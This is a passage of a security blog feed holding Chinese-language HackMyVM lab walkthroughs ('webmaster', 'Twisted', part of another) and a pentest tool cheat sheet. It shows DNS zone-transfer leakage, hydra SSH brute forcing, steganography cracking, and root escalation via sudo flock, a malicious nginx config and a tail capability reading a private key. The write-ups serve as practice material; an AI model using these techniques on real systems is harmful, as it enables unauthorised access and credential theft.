class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><p>文件中有个特别注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idrinksomewater */</span></span><br></pre></td></tr></table></figure><p>结合&#x2F;home下的用户名作为登录凭据</p><h2 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/bin/flock</span><br></pre></td></tr></table></figure><p>使用 <code>flock</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure><p>flock [选项] &lt;锁文件&gt; &lt;命令&gt;<br>这里的-u &#x2F;并不影响，重要的是root权限执行了flock，然后后面通过flock执行的命令就也是root权限。<br>以root权限解锁根目录并执行&#x2F;bin&#x2F;sh。<br>成功获取 root shell。</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><ul><li>插件泄露 + CVE-2020-25213</li><li>服务的配置文件查询</li><li>flock提权</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、端口扫描&quot;&gt;&lt;a href=&quot;#一、端口扫描&quot; class=&quot;headerlink&quot; title=&quot;一、端口扫描&quot;&gt;&lt;/a&gt;一、端口扫描&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="靶机" scheme="https://lontan0.github.io/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lontan0.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
    <category term="hackmyvm" scheme="https://lontan0.github.io/tags/hackmyvm/"/>
    
  </entry>
  
  <entry>
    <title>hackmyvm-webmaster</title>
    <link href="https://lontan0.github.io/2025/07/02/hackmyvm-webmaster/"/>
    <id>https://lontan0.github.io/2025/07/02/hackmyvm-webmaster/</id>
    <published>2025-07-02T14:35:24.000Z</published>
    <updated>2025-07-03T15:41:40.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.105</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">53/tcp open  domain  Eero device dnsd</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><p>53 端口为 DNS 服务，80 端口为 nginx Web 服务。</p><h2 id="二、DNS-Zone-Transfer-信息泄露"><a href="#二、DNS-Zone-Transfer-信息泄露" class="headerlink" title="二、DNS Zone Transfer 信息泄露"></a>二、DNS Zone Transfer 信息泄露</h2><p>首先看80端口</p><p>利用 <code>dig</code> 工具进行 DNS 区域传送（AXFR）测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AXFR（Zone Transfer）是 DNS 用于把整个 Zone 批量同步给别人的协议。</span><br><span class="line">如果 DNS 管理员没加限制，AXFR 就相当于说：</span><br><span class="line">“我只要知道你叫啥名字（domain），然后敲个门（dig），你就把你家的全体成员名单 + 内网地址 + 邮件通道都告诉我。”</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig @192.168.56.105 webmaster.hmv AXFR +tcp</span><br><span class="line"></span><br><span class="line">webmaster.hmv.      IN SOA   ns1.webmaster.hmv. root.webmaster.hmv. ...</span><br><span class="line">ftp.webmaster.hmv.  IN CNAME www.webmaster.hmv.</span><br><span class="line">john.webmaster.hmv. IN TXT   <span class="string">&quot;Myhiddenpazzword&quot;</span></span><br><span class="line">mail.webmaster.hmv. IN A     192.168.0.12</span><br><span class="line">ns1.webmaster.hmv.  IN A     127.0.0.1</span><br><span class="line">www.webmaster.hmv.  IN A     192.168.0.11</span><br></pre></td></tr></table></figure><p>发现：<br><code>john.webmaster.hmv</code> 的 包含，TXT 和疑似密码 <code>Myhiddenpazzword</code>，测试john作为用户名 SSH 登录。</p><h2 id="三、SSH-登录"><a href="#三、SSH-登录" class="headerlink" title="三、SSH 登录"></a>三、SSH 登录</h2><p>使用用户名 <code>john</code> 和从 DNS TXT 记录获得的密码尝试登录 SSH：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.56.105</span><br></pre></td></tr></table></figure><p>成功登录后，发现用户家目录有 <code>flag.sh</code>，直接读flag的，但是只能读取权限内的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/sbin/nginx</span><br></pre></td></tr></table></figure><p>这里是知识盲区，之后看大佬wp，要写nginx恶意配置文件</p><h2 id="四、利用-nginx-配置提权"><a href="#四、利用-nginx-配置提权" class="headerlink" title="四、利用 nginx 配置提权"></a>四、利用 nginx 配置提权</h2><p>创建恶意 nginx 配置文件 <code>nginx.conf</code>，内容如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span> root;</span><br><span class="line"><span class="attribute">worker_processes</span> <span class="number">4</span>;</span><br><span class="line"><span class="attribute">pid</span> /tmp/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="attribute">root</span> /;</span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置说明：</p><ul><li>以 <code>root</code> 用户启动 nginx worker 进程。</li><li>监听端口 <code>1234</code>。</li><li>根目录设置为系统根目录 <code>/</code>。</li><li>开启目录浏览功能 <code>autoindex on</code>。</li></ul><p>使用 sudo 权限运行 nginx 并加载该配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/sbin/nginx -c /home/john/nginx.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.105:1234/root/root.txt</span><br></pre></td></tr></table></figure><p>即可读取 root 权限下敏感文件，实现文件泄露。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><ul><li>DNS Zone Transfer 利用</li><li>恶意 nginx 配置</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、信息收集&quot;&gt;&lt;a href=&quot;#一、信息收集&quot; class=&quot;headerlink&quot; title=&quot;一、信息收集&quot;&gt;&lt;/a&gt;一、信息收集&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="靶机" scheme="https://lontan0.github.io/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lontan0.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
    <category term="hackmyvm" scheme="https://lontan0.github.io/tags/hackmyvm/"/>
    
  </entry>
  
  <entry>
    <title>tools</title>
    <link href="https://lontan0.github.io/2025/07/02/tools/"/>
    <id>https://lontan0.github.io/2025/07/02/tools/</id>
    <published>2025-07-02T02:43:00.000Z</published>
    <updated>2025-07-03T15:44:27.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-gobuster"><a href="#1-gobuster" class="headerlink" title="1.gobuster"></a>1.gobuster</h2><h3 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>目录扫描模式</td></tr><tr><td>-u</td><td>指定目标url</td></tr><tr><td>-w</td><td>指定字典</td></tr><tr><td>-x</td><td>添加文件后缀名</td></tr><tr><td>-t</td><td>指定并发扫描的线程数量</td></tr></tbody></table><h2 id="2-hydra"><a href="#2-hydra" class="headerlink" title="2.hydra"></a>2.hydra</h2><p>hydra -L up.txt -p up.txt ssh:&#x2F;&#x2F;192.168.56.104:2222 -V</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-L</td><td>指定用户名字典</td></tr><tr><td>-l</td><td>指定用户名</td></tr><tr><td>-P</td><td>指定密码字典</td></tr><tr><td>-p</td><td>指定密码</td></tr><tr><td>-V</td><td>输出每一次尝试爆破的用户名和密码以及结果</td></tr></tbody></table><h2 id="3-stegseek"><a href="#3-stegseek" class="headerlink" title="3.stegseek"></a>3.stegseek</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb</span><br><span class="line"><span class="built_in">sudo</span> apt install ./stegseek_0.6-1.deb</span><br></pre></td></tr></table></figure><p>kali最新版本需要安装旧依赖<br>wget <a href="http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb">http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb</a><br>wget <a href="http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb">http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb</a><br>sudo dpkg -i libmhash2_0.9.9.9-7+b1_amd64.deb<br>sudo dpkg -i libmcrypt4_2.5.8-3.4_amd64.deb</p><p>stegseek -wl &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt cat-hidden.jpg </p><table><thead><tr><th>参数</th><th>作用</th><th></th></tr></thead><tbody><tr><td>-wl</td><td>指定字典爆破密码</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h2 id="4-dig"><a href="#4-dig" class="headerlink" title="4.dig"></a>4.dig</h2><p><code>dig</code>（Domain Information Groper）是一个DNS 查询工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [@DNS服务器] [域名] [记录类型] [参数...]</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>A</td><td>主机地址（IPv4）</td></tr><tr><td>AAAA</td><td>主机地址（IPv6）</td></tr><tr><td>MX</td><td>邮件服务器记录</td></tr><tr><td>NS</td><td>授权名称服务器</td></tr><tr><td>CNAME</td><td>规范名称（别名）</td></tr><tr><td>TXT</td><td>文本记录（SPF&#x2F;验证信息）</td></tr><tr><td>SOA</td><td>Start of Authority（起始权威）</td></tr><tr><td>AXFR</td><td>区域传送（Zone Transfer）</td></tr></tbody></table><table><thead><tr><th>参数</th><th>功能说明</th></tr></thead><tbody><tr><td><code>+short</code></td><td>只显示简洁的答案（比如 IP 地址）</td></tr><tr><td><code>+tcp</code></td><td>使用 TCP 协议（⚠️AXFR 必须使用 TCP）</td></tr><tr><td><code>+noquestion</code></td><td>不显示查询问题部分（请求行）</td></tr><tr><td><code>+nocomments</code></td><td>不显示注释</td></tr><tr><td><code>+nostats</code></td><td>不显示统计信息</td></tr><tr><td><code>+nocmd</code></td><td>不显示命令提示头</td></tr><tr><td><code>+multiline</code></td><td>美化输出格式，多行展示</td></tr><tr><td><code>+trace</code></td><td>启用跟踪模式，从根服务器逐级查询域名</td></tr></tbody></table><h2 id="5-searchsploit"><a href="#5-searchsploit" class="headerlink" title="5.searchsploit"></a>5.searchsploit</h2><p><code>searchsploit</code> 是一个命令行工具，用于在本地快速搜索 <strong>Exploit Database</strong> 中已知的漏洞利用代码（PoC）和漏洞信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line"></span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-u</code></td><td>更新本地数据库（相当于 <code>git pull</code>）</td></tr><tr><td><code>-p</code></td><td>显示 Exploit 的完整路径</td></tr><tr><td><code>-x &lt;路径&gt;</code></td><td>直接显示 PoC 文件内容</td></tr><tr><td><code>-m &lt;路径&gt;</code></td><td>复制 PoC 到当前目录</td></tr><tr><td><code>--json</code></td><td>输出为 JSON 格式，便于脚本处理</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">本文记录使用kali打靶遇到的工具及命令</summary>
    
    
    
    <category term="笔记" scheme="https://lontan0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="https://lontan0.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>hackmyvm-Twisted</title>
    <link href="https://lontan0.github.io/2025/07/02/hackmyvm-Twisted/"/>
    <id>https://lontan0.github.io/2025/07/02/hackmyvm-Twisted/</id>
    <published>2025-07-02T02:40:47.000Z</published>
    <updated>2025-07-03T15:41:45.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.104</span><br><span class="line">80/tcp   open  http    nginx 1.14.2</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2</span><br></pre></td></tr></table></figure><h2 id="二、Web-分析（端口-80）"><a href="#二、Web-分析（端口-80）" class="headerlink" title="二、Web 分析（端口 80）"></a>二、Web 分析（端口 80）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.56.104</span><br></pre></td></tr></table></figure><p>返回页面内容提示对两张图片进行比较：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love cats!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-original.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat original&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>But I prefer this one because seems different<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-hidden.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat Hidden&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>尝试 stegsolve 和 010 Editor等后去看大佬wp，用 stegseek：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg  </span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> cat-hidden.jpg.out </span><br><span class="line">thisismypassword</span><br><span class="line"><span class="built_in">cat</span> cat-original.jpg.out</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><p>猜测疑似的用户与密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mateo</span><br><span class="line">markus</span><br><span class="line">bonita</span><br><span class="line">thisismypassword</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><h2 id="三、爆破-SSH-登录"><a href="#三、爆破-SSH-登录" class="headerlink" title="三、爆破 SSH 登录"></a>三、爆破 SSH 登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L up.txt -p up.txt ssh://192.168.56.104:2222 -V</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: markus   password: markuslovesbonita</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: mateo   password: thisismypassword</span><br></pre></td></tr></table></figure><h2 id="四、本地信息探测"><a href="#四、本地信息探测" class="headerlink" title="四、本地信息探测"></a>四、本地信息探测</h2><p>登录后查看 note.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi bonita,</span><br><span class="line">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class="line">Nobody can find it.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /var/cache/apt/id_rsa</span><br><span class="line">-rw------- 1 root root     1823 Oct 14  2020 id_rsa</span><br></pre></td></tr></table></figure><h2 id="五、查找-Capability-权限"><a href="#五、查找-Capability-权限" class="headerlink" title="五、查找 Capability 权限"></a>五、查找 Capability 权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/getcap / -r 2&gt;/dev/null</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure><p><code>tail</code> 可以以root权限读取任意文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tail -n +1 /var/cache/apt/id_rsa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa bonita@192.168.56.104 -p 2222</span><br></pre></td></tr></table></figure><h2 id="六、本地提权（SUID）"><a href="#六、本地提权（SUID）" class="headerlink" title="六、本地提权（SUID）"></a>六、本地提权（SUID）</h2><p>bonita 用户目录下发现 suid 文件：<code>beroot</code></p><p>运行后提示输入 code，使用ida静态分析得知：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n5880; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the code:\n &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;n5880);</span><br><span class="line">  <span class="keyword">if</span> ( n5880 == <span class="number">5880</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nWRONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输入 <code>5880</code> 即可获得 root：</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><ul><li>stegseek（爆破 JPEG 隐写）</li><li>getcap查看Capability 权限命令</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、信息收集&quot;&gt;&lt;a href=&quot;#一、信息收集&quot; class=&quot;headerlink&quot; title=&quot;一、信息收集&quot;&gt;&lt;/a&gt;一、信息收集&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    <category term="靶机" scheme="https://lontan0.github.io/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lontan0.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
    <category term="hackmyvm" scheme="https://lontan0.github.io/tags/hackmyvm/"/>
    
  </entry>
  
  <entry>
    <title>hackmyvm-alzheimer</title>
    <link href="https://lontan0.github.io/2025/07/01/hackmyvm-alzheimer/"/>
    <id>https://lontan0.github.io/2025/07/01/hackmyvm-alzheimer/</id>
    <published>2025-07-01T06:00:00.000Z</published>
    <updated>2025-07-03T15:41:50.878Z</updated>
    
